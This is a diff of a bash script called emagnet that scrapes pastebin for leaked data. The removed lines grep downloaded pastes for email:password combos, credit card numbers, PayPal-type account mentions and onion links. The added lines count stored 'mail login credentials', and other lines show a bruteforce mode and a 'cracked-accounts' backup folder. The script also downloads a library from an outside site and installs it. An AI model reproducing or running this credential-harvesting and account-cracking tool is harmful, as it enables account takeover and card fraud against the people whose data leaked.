-    echo -e " [3] - Amex, Master Card and Visa credit cards"
-    echo -e " [4] - IPv4 Addresses"
-    echo -e " [5] - IPv6 Addresses"
-    echo -e " [6] - Search files that contains PayPal, Neteller or Skrill words"
-    echo -e " [7] - Find urls that is for live/online streaming"
-    echo -e " [8] - Find hidden onion urls that being shared"
-    echo -e " [9] - Custom Search for anything you wanna find"
-    echo -e " [q] - Quit\n"
-    echo -e "=================================================================\n"
-
-emagnet_findemailaddresses() {
-     grep -rEo "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $EMAGNET \
-    |cut -d: -f2 \
-    |awk '{print NR-1 "-> " $0}' \
-    |awk -F, '!seen[$1]++'
-}
-
-emagnet_findemailsandpasswords() {
-    grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNET \
-    |awk '{print $1}'\
-    |cut -d: -f2,3\
-    |uniq\
-    |grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\' \
-    |grep -v "/" \
-    |awk '{print NR-1 "-> " $0}' \
-    |awk -F, '!seen[$1]++'
-}
-emagnet_findcreditcards() {
-# This is an really advanced regex that works pretty good now
-# I working hard for make this even more complex.
-# - What it actually does is:
-# Searching for AMEX/Visa/Master Cards
-# and it will only grep files that includes
-# a cc card number togheter with any of the words above
-    grep -riE "[2-6][0-9]{3}([ -]?)[0-9]{4}([ -]?)[0-9]{4}([ -]?)[0-9]{3,4}([ -]?)[0-9]{0,3}[^a-zA-Z]?"i $EMAGNET \
-    |grep -i 'Visa.*\|Creditcard\|credit\ card\|CC Number\|Card Info\|mastercard.*\*.mastercard\|*.visa'
-}
-
-emagnet_findipv4addresses() {
-     grep -roE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' $EMAGNET|awk -F":" '{print $2}'|awk '{print NR-1 "-> " $0}'|awk '!seen[$0]++'
-}
-
-emagnet_findipv6addresses() {
-    grep -roE "\b([0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4}\b" $EMAGNET|awk '{print NR-1 "-> " $0}'|cut -d: -f2-|awk '!seen[$0]++'
-}
-
-emagnet_findpaypalleaks() {
-    grep -iroE "paypal\|neteller\|skrill" $EMAGNET|awk -F, '!seen[$1]++'|awk '{print NR-1 "-> " $0}'|awk '!seen[$0]++'
-}
-
-emagnet_findstreaming() {
-    grep -iroE "EXTINF" $EMAGNET|awk -F, '!seen[$1]++'|awk '{print NR-1 "-> " $0}'|awk '!seen[$0]++'
-}
-
-emagnet_findonionurls() {
-     grep -rEo "h....\/\/.*onion$" $EMAGNET|cut -d: -f2,3,4,5|awk '!seen[$0]++'
-}
-
-emagnet_customsearch() {
-     read -p " [S] - What are you looking for: " searchfor
-     grep -ri "$searchfor" $EMAGNET|awk -F, '!seen[$1]++'|awk '{print NR-1 "-> " $0}'
-}
-
-read -p "[0] - Option: " diagst
-        case "$diagst" in
-                1) emagnet_findemailaddresses                                                       ;;
-                2) emagnet_findemailsandpasswords                                                   ;;
-                3) emagnet_findcreditcards                                                          ;;
-                4) emagnet_findipv4addresses                                                        ;;
-                5) emagnet_findipv6addresses                                                        ;;
-                6) emagnet_findpaypalleaks                                                          ;;
-                7) emagnet_findstreaming                                                            ;;
-                8) emagnet_findonionurls                                                            ;;
-                9) emagnet_customsearch                                                             ;;
-                9) exit 0                                                                           ;;
-                *) echo -e "$basename$0: internal error -- $diagst is an unknown option, exiting.." ;;
-               \?) echo -e "$basename$0: internal error -- $diagst is an Unknown option, exiting.." ;;
-        esac
-}
-
-
-countdown() {
-  emagnet_clear;emagnet_banner
-if [[ $API = "true" ]]; then
-  sed -i 's/API=true/API=false/g' $CONF
-  echo -e "You have set API to true but your IP is not whitelisted for scraping. "
-  echo -e "Whitelist your ip at: https://pastebin.com/doc_scraping_api\n"
-  echo -e "API has been set to false and emagnet will not be able to scrape"
-  echo -e "pastebin until you added your IP, using pastebin.com/archive until then\n "
-  secs=10
-  shift
-  msg=$@
-  while [ $secs -gt 0 ]
-  do
-             printf "\r\033[KContinues in %.d seconds $msg..." $((secs--))
-    sleep 1
-  done
-  echo
-fi
-}
 
 ###############################################################################
 #### This is stats function when you using emagnet -s for count stats.......####
 ################################################################################
 emagnet_stats() {
-   emagnet_clear;emagnet_banner;emagnet_conf
-   printf "Please wait..."
-   TOTALFILES=$(ls $EMAGNETARCHIVE/all-files | wc -l)
-   TEMAILFILES=$(grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETARCHIVE/all-files | cut -d: -f1|uniq|sort| wc -l)
-   TPASSWORDFILES=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETARCHIVE/all-files|awk '{print $1}'|cut -d: -f1|uniq|grep -v '"'\|','\|'<'\|'>'|uniq|sort|wc -l)
-   TEMAILS=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $EMAGNETARCHIVE/all-files|awk -F, '!seen[$1]++'|wc -l)
-   TPASSWORDS=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETARCHIVE/all-files|awk -F, '!seen[$1]++'|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ' '\|'/'\|'"'\|','\|'<'\|'>'|wc -l)
-   emagnet_clear; emagnet_banner;
-   printf '+ Please wait, counting data                              [\e[1;32mDONE\e[0m]'
-   sleep 1;emagnet_clear;emagnet_banner;
-   printf "%23s EMAGNET STATS\n\n"
+	FILES=$(find $EMAGNET -type f|grep -v ".txt\|.gif\|.sh$\|tar.gz$" &> /dev/null)
+    if [[ "$FILES" -gt "0" ]]; then
+        echo -e "$basename$0: internal error -- nothing downloaded, nothing to count, exiting..."
+    else
+        emagnet="stats"
+	   	line='       '
+        printf "[\e[1;32m%s\e[m] %s %s - Please wait" $emagnet "${line:${#emagnet}}"
+        TOTAL_FILES=$(find $EMAGNET -type f|wc -l)
+        TOTAL_MAIL_FILES=$(find $EMAGNET|grep -c -i "email-files")
+        TOTAL_PASSWORD_FILES=$(find $EMAGNET|grep -c -i "password-files")
+        TOTAL_MAIL_ADDRESSES=$(find $EMAGNET -type f -name emails-from-pastebin.txt|xargs cat|wc -l)
+        TOTAL_MAIL_AND_PASSWORDS=$(find $EMAGNET -type f -name passwords-from-pastebin.txt|xargs cat|wc -l)
+	   	printf ", done...\n"
+        [[ $TOTAL_FILES = "0" ]] && TOTAL_FILES="0$TOTAL_MAIL_FILES"
+        printf "[\e[1;32m%s\e[m] %s %s - Total files downloaded\n" $TOTAL_FILES "${line:${#TOTAL_FILES}}"
 
-for tpasswordsfiles in "$TPASSWORDFILES"; do
-  if [[ $TPASSWORDFILES -lt "10" ]]; then
-    printf "Total Files That Includes Atleast 1 Password"; printf "%s%s%11s[\e[1;31m0$TPASSWORDFILES%10d\e[0m]\n"|tr ' ' '.'
-  else
-    printf "Total Files That Includes Atleast 1 Password"; printf "s%s%11s[\e[1;32m$TPASSWORDFILES\e[0m]\n"|tr ' ' '.'
- fi
-done
+        [[ $TOTAL_MAIL_FILES = "0" ]] && TOTAL_MAIL_FILES="0$TOTAL_MAIL_FILES"
+        printf "[\e[1;32m%s\e[m] %s %s - Total files that included at least one mail address\n" $TOTAL_MAIL_FILES  "${line:${#TOTAL_MAIL_FILES}}"
+        
+        [[ $TOTAL_PASSWORD_FILES = "0" ]] && TOTAL_PASSWORD_FILES="0$TOTAL_PASSWORD_FILES"
+        printf "[\e[1;32m%s\e[m] %s %s - Total files that included at least one combo: mail:password\n" $TOTAL_MAIL_FILES  "${line:${#TOTAL_MAIL_FILES}}"
+        
+        [[ $TOTAL_MAIL_ADDRESSES = "0" ]] && TOTAL_MAIL_ADDRESSES="0$TOTAL_MAIL_ADDRESSES"
+        printf "[\e[1;32m%s\e[m] %s %s - Total mail addresses found\n" $TOTAL_MAIL_ADDRESSES "${line:${#TOTAL_MAIL_ADDRESSES}}"
+        
+        [[ $TOTAL_MAIL_AND_PASSWORDS = "0" ]] && TOTAL_MAIL_AND_PASSWORDS="0$TOTAL_MAIL_AND_PASSWORDS"
+        printf "[\e[1;32m%s\e[m] %s %s - Total mail login credenticals stored\n" $TOTAL_MAIL_AND_PASSWORDS "${line:${#TOTAL_MAIL_AND_PASSWORDS}}"
 
-for temailfiles in "$TEMAILFILES"; do
-  if [[ $TEMAILFILES -lt "10" ]]; then
-    printf "Total Files That Includes Atleast 1 Mail Address";printf "%s%s%8s[\e[1;31m00\e[0m]\n"|tr ' ' '.'
-else
-    printf "Total Files That Includes Atleast 1 Mail Address";printf "%s%s%8s[\e[1;32m$TEMAILFILES\e[0m]\n"|tr ' ' '.'
-  fi
-done
-
-for totalfiles in "$TOTALFILES"; do
-  if [[ $TOTALFILES -lt "10" ]]; then
-    printf "Total Files"; printf "%s%s%45s[\e[1;31m0$TOTALFILES\e[0m]\n"|tr ' ' '.'
-  else
-    printf "Total Files"; printf "%s%s%45s[\e[1;32m$TOTALFILES\e[0m]\n"|tr ' ' '.'
-  fi
-done
-
-for temails in "$TEMAILS"; do
-  if [[ $TEMAILS -lt "10" ]]; then
-    printf "Total Mail Addresses Stored"; printf "%s%s%29s[\e[1;31m0$TEMAILS\e[0m]\n"|tr ' ' '.'
-  else
-    printf "Total Mail Addresses Stored"; printf "%s%s%29s[\e[1;32m$TEMAILS\e[0m]\n"|tr ' ' '.'
-  fi
-done
-
-for tpasswords in "$TPASSWORDS"; do
-  if [[ $TPASSWORDS -lt "10" ]]; then
-    printf "Total Passwords Stored"; printf "%s%s%s%34s[\e[1;31m0$TPASSWORDS\e[0m]\n\n"|tr ' ' '.'
-  else
-    printf "Total Passwords Stored"; printf "%s%s%34s[\e[1;32m$TPASSWORDS\e[0m]\n\n"|tr ' ' '.'
-  fi
-done
+        FILES=$(find $EMAGNET -type f|grep -v ".txt\|.gif\|.sh$\|tar.gz$" &> /dev/null)
+fi
 }
 
 emagnet_distro() {
@@ -1155,25 +939,6 @@ case "${1}" in
           emagnet_author
      ;;
 
-     "-A"|"-api"|"--api")
-         emagnet_required_stuff
-         emagnet_conf
-       if [[ $2 = "true" ]]; then
-          sed -i 's/API=false/API=true/g' $CONF
-          echo -e "$basename$0: config file has been update -- API has been set to true"
-       elif [[ $2 = "false" ]]; then 
-          sed -i 's/API=false/API=false/g' $CONF
-          sed -i 's/API=true/API=false/g' $CONF
-          echo -e "$basename$0: config file has been updated -- API has been set to false"
-       else 
-          echo -e "$basename$0: internal error -- API requires a value to be used (true/false)"
-       fi
-     ;;
-
-     "-B"|"--banned"|"--blocked")
-          emagnet_wasibanned
-      ;;
-
      "emagnet"|"-e"|"-emagnet"|"--emagnet")
         emagnet_conf           # Source emagnet.conf before we do anything else so we know variables are used, like user-agent before check_pastebin
         emagnet_iconnection
@@ -1187,10 +952,6 @@ case "${1}" in
         sed -i 's/RBRUTEFORCE=true/RBRUTEFORCE=false/g' "$CONF"
         emagnet_run4ever
       ;;
-      "-S"|"-search"|"--search")
-           emagnet_conf
-           emagnet_search
-        ;;
 
       "-g"|"-bruteforce"|"--bruteforce")
           emagnet_required_tools
@@ -1285,7 +1046,7 @@ printf "%s" "Downloading libspoify........"; wget -q https://nr1.nu/archive/libs
 printf "%s" "Extracting libspoify..,......"; tar -xf /tmp/libspotify_12.1.51.orig-amd64.tar.gz -C /tmp; printf "ok\n"
 printf "%s" "Installing libspotify........"; cd /tmp/libspotify-12.1.51-Linux-x86_64-release/&> /dev/null; printf "ok\n"  & make install prefix=/usr/local &> /dev/null; printf "ok\n"
 #printf "%s" "Installing libspotify........"; cd /tmp/libspotify-12.1.51-Linux-x86_64-release/  & make install prefix=/usr/local &> /dev/null; printf "ok\n"
-printf "%s" "Preparing emagnet.conf......."; emagnet_conf;sed -i '248d' "$CONF";sed -i '248 i LIBSPOTIFY=true' "$CONF"; printf "ok\n"
+printf "%s" "Preparing emagnet.conf......."; emagnet_conf;sed -i 's/LIBSPOTIFY/LIBSPOTIFY=true/g' "$CONF"; printf "ok\n"
 echo -e "\nAll done, will continue in 3 seconds!"
 sleep 2
 else
@@ -1364,21 +1125,13 @@ fi
                 emagnet_license
                 ;;
 
-      "-m"|"-merge"|"--merge")
-                emagnet_required_stuff
-                emagnet_conf
-                emagnet_merge
-                ;;
-
-      "-M"|"-move"|"--move")
-                emagnet_required_stuff
+      "-m"|"-move"|"--move")
                 emagnet_conf
                 emagnet_move_files
                 ;;
 
       "-d"|"-stats"|"--stats")
-                emagnet_required_stuff
-                emagnet_conf
+                emagnet_conf &> /dev/null
                 emagnet_stats
                 ;;
 
@@ -1411,72 +1164,25 @@ fi
                 exit 1
                 ;;
 
-        "-n"|"-notify"|"--notify")
-            emagnet_required_stuff
-            emagnet_conf
-            which "notify-send" &> /dev/null
-                if [[ "$?" -gt "0" ]]; then echo -e "$basename$0: internal error -- notify-send is required to be installed";exit 1; fi
-                if [[ "$2" != "true" && "$2" != "false" || -z "$2" ]]; then echo -e "$basename$0: internal error -- you must use true or false";exit 1;fi
-                if ! [[ "$NOTIFY" -eq "truee" ]]; then
-                   notify-send "Emagnet" '\n[00] - This is a test\n[00] - If you see this\n[00] - Press Any Key'
-                     echo -e "\rIf you see the notification, hit any key.\c"
-                     read -t 5 notifyworks
-                       if [[ ! -z "$yepitworks" ]] ; then
-                          echo -e "\nOk, seems not, you probably must export your display then.."
-                          exit 1
-                       else
-                          echo -e "\n$basename$0: config file has been updated -- notifications has been enable"
-                          sed -i '150d' "$CONF";sed -i "150 i NOTIFY=truee"  "$CONF";printf "$basename$0: config file has been updated -- notifications has been enable\n"
-                          exit 1
-                       fi
-                  fi
-                # Since user already has answered if notifications works once, we set notify to truee instead of true so we know
-                if [[ $2 = "true" ]];  then sed -i '149d' "$CONF";sed -i "149 i NOTIFY=truee"  "$CONF";printf "$basename$0: config file has been updated -- notifications has been enable\n"; fi
-                if [[ $2 = "false" ]]; then sed -i '149d' "$CONF";sed -i "149 i NOTIFY=false" "$CONF";printf "$basename$0: config file has been updated -- notifications has been disable\n";fi
-                ;;
-
         "-b"|"-backup"|"--backup")
-            emagnet_required_stuff
-            emagnet_conf
-            [[ -d "$EMAGNETBACKUP" ]] && mkdir -p "$EMAGNETBACKUP"
+            emagnet_conf &> /dev/null
+            [[ ! -d ${EMAGNETBACKUP} ]]  && mkdir -p ${EMAGNETBACKUP}
                 if [[ "$2" = "all" ]]; then
-                   printf "%s" "Creating a tar archive of $EMAGNET"
-                   pigz -h &> /dev/null
-                   if [[ "$?" -ne "0" ]]; then
-                       TAR="tar cf - --absolute-names $EMAGNET" 
-                   else
-                       TAR="tar -cf - --absolute-names $EMAGNET | pigz -0 -p $THREADS --fast"
-                   fi
-                   $TAR > "$EMAGNETBACKUP/emagnet-${2}-$(date +%d%m%Y).tar.gz"
-                   printf "..Done..\nBackup: $EMAGNETBACKUP/emagnet-${2}-$(date +%d%m%Y).tar.gz\n"
+                   printf '%s %s' 'Please wait,' "creating a tar archive of $EMAGNET..."
+                   tar fczP $EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz --absolute-names $EMAGNET 
+                   printf "..Done..\nBackup: $EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz\n" &> /dev/null
                    exit 1
-                 elif [[ "$2" = "archive" || "$2" = "incoming" ]]; then
-                   printf '%s' "Creating a tar archive of $EMAGNET/${2}"
-                   pigz -h &> /dev/null
-                   [[ "$?" -ne "0" ]] && TAR="tar cf - --absolute-names $EMAGNET/$2" || TAR="tar -cf --absolute-names - $EMAGNET/$2 | pigz -0 -p $THREADS --fast"
-                   $TAR > "$EMAGNETBACKUP/emagnet-${2}-$(date +%d%m%Y).tar.gz"
-                   printf "..Done..\nBackup: $EMAGNETBACKUP/emagnet-${2}-$(date +%d%m%Y).tar.gz\n"
+                 elif [[ "$2" = "archive" || "$2" = "incoming" || "$2" = "cracked-accounts" ]]; then
+                   printf '%s %s' 'Please wait,' "creating a tar archive of $EMAGNET/${2}..."
+                   tar fczP "$EMAGNETBACKUP/emagnet-${2}-$(date +%d%m%Y).tar.gz" --absolute-names $EMAGNET/${2} &> /dev/null
+                   printf "ok...\nBackup: $EMAGNETBACKUP/emagnet-${2}-$(date +%d%m%Y).tar.gz\n"
                    exit 1
                  else
-                  echo -e "$basename$0: internal error -- you must choose one of: incoming, archive or all"
+                  echo -e "$basename$0: internal error -- you must choose one of the dirs: all, archive, cracked-accounts or incoming"
                   exit 1
                 fi
                 ;;
-         "-p"|"--proxy"|"--p")
-              emagnet_required_stuff
-              if [[ "$2" = "true" ]]; then
-                 sed -i 's/PROXY=false/PROXY=true/g' $CONF
-                 echo -e "$basename$0: config file has been updated -- proxy has been enable"
-               elif [[ "$2" = "false" ]]; then
-             
-                sed -i 's/PROXY=true/PROXY=false/g' $CONF
-                 echo -e "$basename$0: config file has been updated -- proxy has been disabled"
-               else
-                 echo -e "$basename$0: internal error -- you must set proxy to true or false"
-                 exit 1
-              fi
-               ;;
-      
+
     "\?")
               printf "emagnet: internal error -- use --help for available commands'\n\n"
               exit 1 ;;
